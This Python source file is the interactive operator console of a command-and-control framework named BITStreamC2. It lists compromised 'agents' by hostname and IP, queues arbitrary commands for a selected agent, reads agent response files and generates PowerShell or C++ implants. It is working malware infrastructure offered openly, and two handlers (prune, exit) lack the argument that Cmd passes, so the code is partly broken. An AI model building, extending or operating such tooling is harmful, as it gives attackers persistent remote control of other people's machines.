import os
from cmd import Cmd
from tabulate import tabulate
from colorama import Fore, Style
from utils import log_error, log_info

class BITStreamShell(Cmd):
    prompt = f"{Fore.CYAN}BSC2[None]>{Style.RESET_ALL} "

    def __init__(self, agent_manager):
        super().__init__()
        self.agent_manager = agent_manager
        self.intro = f"{Fore.MAGENTA}Welcome to BITStreamC2 Shell. Type 'help' for commands.{Style.RESET_ALL}"

    def emptyline(self):
        # Prevent repeating the last command on empty input
        pass

    def do_list(self, arg):
        try:
            self.agent_manager.check_notify_file()
            agents = self.agent_manager.get_agents()
            if not agents:
                print(f"{Fore.YELLOW}[*] No agents registered.{Style.RESET_ALL}")
                return
            table = []
            for agent_id, agent in agents.items():
                table.append([
                    agent_id,
                    agent.get("hostname", "Unknown"),
                    agent.get("ip", "Unknown"),
                    agent.get("last_seen", "Unknown"),
                    agent.get("status", "Unknown")
                ])
            print(tabulate(table, headers=["Agent ID", "Hostname", "IP", "Last Seen", "Status"], tablefmt="fancy_grid"))
        except Exception as e:
            print(f"{Fore.RED}[-] Error listing agents: {e}{Style.RESET_ALL}")
            log_error(f"Error listing agents: {e}", self.agent_manager.log_file)

    def do_select(self, arg):
        try:
            args = arg.split()
            if len(args) != 2 or args[0] != "agent":
                print(f"{Fore.RED}[-] Usage: select agent <agent_id>{Style.RESET_ALL}")
                return
            agent_id = args[1]
            agent = self.agent_manager.get_agent(agent_id)
            if agent:
                self.agent_manager.selected_agent = agent_id
                self.prompt = f"{Fore.CYAN}BSC2[{agent_id}]>{Style.RESET_ALL} "
                print(f"{Fore.GREEN}[+] Selected agent: {agent_id}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Agent {agent_id} not found{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error selecting agent: {e}{Style.RESET_ALL}")
            log_error(f"Error selecting agent: {e}", self.agent_manager.log_file)

    def do_exitagent(self, arg):
        if self.agent_manager.selected_agent:
            print(f"{Fore.YELLOW}[*] Exiting agent: {self.agent_manager.selected_agent}{Style.RESET_ALL}")
            self.agent_manager.selected_agent = None
            self.prompt = f"{Fore.CYAN}BSC2[None]>{Style.RESET_ALL} "

    def do_set(self, arg):
        try:
            args = arg.split(maxsplit=1)
            if len(args) != 2 or args[0] != "command" or not self.agent_manager.selected_agent:
                print(f"{Fore.RED}[-] Usage: set command <command> (select an agent first){Style.RESET_ALL}")
                return
            command = args[1]
            if not hasattr(self.agent_manager, 'queue_command'):
                raise AttributeError("AgentManager is missing 'queue_command' method")
            self.agent_manager.queue_command(self.agent_manager.selected_agent, command)
            self.agent_manager.set_command(command, self.agent_manager.selected_agent)
        except Exception as e:
            print(f"{Fore.RED}[-] Error setting command: {e}{Style.RESET_ALL}")
            log_error(f"Error setting command: {e}", self.agent_manager.log_file)

    def do_show(self, arg):
        try:
            args = arg.split()
            if not args:
                print(f"{Fore.RED}[-] Usage: show agents | show commands{Style.RESET_ALL}")
                return
            if args[0] in ["agents"]:
                self.do_list(arg)
            elif args[0] in ["commands", "command"]:
                if not self.agent_manager.selected_agent:
                    print(f"{Fore.RED}[-] No agent selected{Style.RESET_ALL}")
                    return
                commands = self.agent_manager.command_queue.get(self.agent_manager.selected_agent, [])
                if not commands:
                    print(f"{Fore.YELLOW}[*] No commands queued for {self.agent_manager.selected_agent}{Style.RESET_ALL}")
                    return
                table = [[i + 1, cmd] for i, cmd in enumerate(commands)]
                print(f"{Fore.YELLOW}[*] Queued commands for {self.agent_manager.selected_agent}:{Style.RESET_ALL}")
                print(tabulate(table, headers=["Index", "Command"], tablefmt="fancy_grid"))
            else:
                print(f"{Fore.RED}[-] Invalid option. Use: show agents | show commands{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error showing details: {e}{Style.RESET_ALL}")
            log_error(f"Error showing details: {e}", self.agent_manager.log_file)

    def do_remove(self, arg):
        try:
            args = arg.split()
            if len(args) != 2 or args[0] != "agent":
                print(f"{Fore.RED}[-] Usage: remove agent <agent_id>{Style.RESET_ALL}")
                return
            agent_id = args[1]
            self.agent_manager.remove_agent(agent_id)
        except Exception as e:
            print(f"{Fore.RED}[-] Error removing agent: {e}{Style.RESET_ALL}")
            log_error(f"Error removing agent: {e}", self.agent_manager.log_file)

    def do_prune(self):
        try:
            pruned = self.agent_manager.prune_stale_agents()
            if pruned:
                print(f"{Fore.GREEN}[+] Pruned agents: {', '.join(pruned)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[*] No stale agents to prune.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error pruning agents: {e}{Style.RESET_ALL}")
            log_error(f"Error pruning agents: {e}", self.agent_manager.log_file)

    def do_debug(self, arg):
        try:
            print(f"{Fore.YELLOW}=== Debug Status ==={Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Notify file: {self.agent_manager.notify_file}{Style.RESET_ALL}")
            if os.path.exists(self.agent_manager.notify_file):
                with open(self.agent_manager.notify_file, "r", encoding="utf-8") as f:
                    content = f.read().strip()
                print(f"{Fore.YELLOW}[*] Notify file contents:{Style.RESET_ALL}\n{content}")
            else:
                print(f"{Fore.YELLOW}[*] Notify file does not exist{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Response files in {self.agent_manager.upload_dir}:{Style.RESET_ALL}")
            for file in os.listdir(self.agent_manager.upload_dir):
                if file.endswith("_response.txt"):
                    file_path = os.path.join(self.agent_manager.upload_dir, file)
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read().strip()
                    print(f"{Fore.YELLOW}[*] {file}:{Style.RESET_ALL}\n{content}")
            print(f"{Fore.YELLOW}[*] Registered agents:{Style.RESET_ALL}")
            self.do_list(arg)
        except Exception as e:
            print(f"{Fore.RED}[-] Error in debug: {e}{Style.RESET_ALL}")
            log_error(f"Error in debug: {e}", self.agent_manager.log_file)

    def do_generate(self, arg):
        try:
            from generate_implant import gen
            args = arg.split()
            if len(args) != 2 or args[0] != "implant":
                print(f"{Fore.RED}[-] Usage: generate implant <language (ps1/cpp)>{Style.RESET_ALL}")
                return
            lang = args[1]
            gen(lang)
        except Exception as e:
            print(f"{Fore.RED}[-] Error generating implant: {e}{Style.RESET_ALL}")
            log_error(f"Error generating implant: {e}", self.agent_manager.log_file)

    def do_exit(self):
        print(f"{Fore.YELLOW}[*] Exiting BITStreamC2 Shell.{Style.RESET_ALL}")
        return True

    def do_help(self, arg):
        print(f"{Fore.YELLOW}=== BITStreamC2 Commands ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}list{Style.RESET_ALL}                                  - List all registered agents")
        print(f"{Fore.CYAN}select agent <id>{Style.RESET_ALL}                     - Select an agent to interact with")
        print(f"{Fore.CYAN}exitagent{Style.RESET_ALL}                             - Exit the currently selected agent")
        print(f"{Fore.CYAN}set command <cmd>{Style.RESET_ALL}                     - Set a command for the selected agent")
        print(f"{Fore.CYAN}show agents|commands{Style.RESET_ALL}                  - Show agents or queued commands")
        print(f"{Fore.CYAN}remove agent <id>{Style.RESET_ALL}                     - Remove an agent by ID")
        print(f"{Fore.CYAN}prune{Style.RESET_ALL}                                 - Remove all stale/offline agents")
        print(f"{Fore.CYAN}debug{Style.RESET_ALL}                                 - Show debug information")
        print(f"{Fore.CYAN}generate implant <language (ps1/cpp)>{Style.RESET_ALL} - Generate an implant")
        print(f"{Fore.CYAN}exit{Style.RESET_ALL}                                  - Exit the shell")

def run_cli(agent_manager):
    shell = BITStreamShell(agent_manager)
    shell.cmdloop()